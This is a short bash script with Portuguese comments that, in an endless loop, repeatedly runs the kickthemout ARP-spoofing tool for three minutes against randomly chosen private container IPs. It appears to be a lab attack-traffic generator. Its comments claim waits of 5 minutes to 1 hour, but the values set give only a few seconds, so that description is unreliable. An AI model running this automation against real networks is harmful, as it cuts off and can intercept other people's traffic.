#!/bin/bash

# Lista com o endereço IP dos contêineres
declare -a TARGET_IPS=("192.168.1.10" "192.168.1.11")

# Número de endereços IP na lista
NUM_IPS=${#TARGET_IPS[@]}

# 5 minutos = 300 segundos
# 1 hora = 3600 segundos
# O intervalo (range) é 3600 - 300 = 3300 segundos
RANGE=33
MIN_TIME=3

# Loop infinito para que o script continue rodando
while true; do
  # 1. Calcular o tempo de espera aleatório
  # (dentro do intervalo [5min,1h])

  # Gera um número aleatório de 0 a 3300, e então soma 300
  # Isso garante um resultado entre 300 (5 min) e 3600 (1 hora)
  RANDOM_TIME=$(($RANDOM % $RANGE + $MIN_TIME))

  echo "[INFO] Próximo ataque em $RANDOM_TIME segundos"
  sleep $RANDOM_TIME

  # 2. Escolher um IP aleatório da lista de IPs
  RANDOM_INDEX=$(($RANDOM % $NUM_IPS))
  TARGET_IP=${TARGET_IPS[$RANDOM_INDEX]}

  # 3. Executar o ARP Spoofing por 180s (3 minutos)
  echo "[INFO] $(date): Executando ARP Spoofing em $TARGET_IP..."
  timeout 180s sudo python3 kickthemout/kickthemout.py --target $TARGET_IP

  echo "[INFO] Ataque em $TARGET_IP concluído."
  echo "-----------------------------------"
done
